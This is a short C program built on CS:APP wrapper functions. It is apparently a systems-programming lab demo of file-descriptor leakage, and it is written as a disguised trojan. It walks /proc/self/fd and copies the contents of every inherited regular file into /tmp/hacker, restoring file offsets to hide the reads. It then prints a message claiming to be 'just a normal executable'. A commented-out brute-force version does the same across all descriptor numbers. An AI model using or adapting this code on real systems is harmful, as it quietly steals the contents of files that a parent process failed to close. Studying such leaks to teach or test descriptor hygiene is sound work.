#include "csapp.h"

int main(void) {
  long max_fd = sysconf(_SC_OPEN_MAX);
  int out = Open("/tmp/hacker", O_CREAT | O_TRUNC | O_WRONLY, 0666);
  
  int proc_fd = Open("/proc/self/fd", O_RDONLY, 0); 
  struct linux_dirent dents[max_fd];
  int num_of_dents = Getdents(proc_fd, dents, max_fd) / sizeof(struct linux_dirent);

  for(long i = 0; i < num_of_dents; i++){
    int fd = atoi(dents[i].d_name);
    if(fd == out) continue;

    char symlink_path[14 + 19 + 1];
    sprintf(symlink_path,"/proc/self/fd/%d",fd);

    char symlink_value[PATH_MAX];
    size_t b_read = Readlink(symlink_path, symlink_value, PATH_MAX);
    symlink_value[b_read] = '\0';

    dprintf(out, "File descriptor %d is '%s' file!\n", fd, symlink_value);

    struct stat file_stat;
    Fstat(fd,&file_stat);
    if((file_stat.st_mode & S_IFMT) != S_IFREG) continue;

    off_t old_pos;
    old_pos = Lseek(fd, 0, SEEK_CUR);
    Lseek(fd, 0, SEEK_SET);

    char buff[BUFSIZ];
    size_t read;
    while ((read = Read(fd, buff, BUFSIZ)))
    {
      Write(out, buff, read);
    }

    Lseek(fd, old_pos, SEEK_SET);
  }

  // brute force
  // for (long i = 3; i < max_fd; i++)
  // {
  //   if(i == out) continue;
    
  //   char symlink_path[14 + 19 + 1];
  //   sprintf(symlink_path,"/proc/self/fd/%ld",i);
    
  //   if(faccessat(-1, symlink_path, F_OK, AT_SYMLINK_NOFOLLOW) < 0) continue;

  //   char symlink_value[PATH_MAX];
  //   size_t b_read = Readlink(symlink_path, symlink_value, PATH_MAX);
  //   symlink_value[b_read] = '\0';

  //   dprintf(out, "\nFile descriptor %ld is '%s' file!\n", i, symlink_value);

  //   off_t old_pos;
  //   if((old_pos = lseek(i, 0, SEEK_CUR)) == -1) continue;
  //   Lseek(i, 0, SEEK_SET);

  //   char buff[BUFSIZ];
  //   size_t read;
  //   while ((read = Read(i, buff, BUFSIZ)))
  //   {
  //     Write(out, buff, read);
  //   }
    
  //   Lseek(i, old_pos, SEEK_SET);
  // }
  

  Close(out);

  printf("I'm just a normal executable you use on daily basis!\n");

  return 0;
}
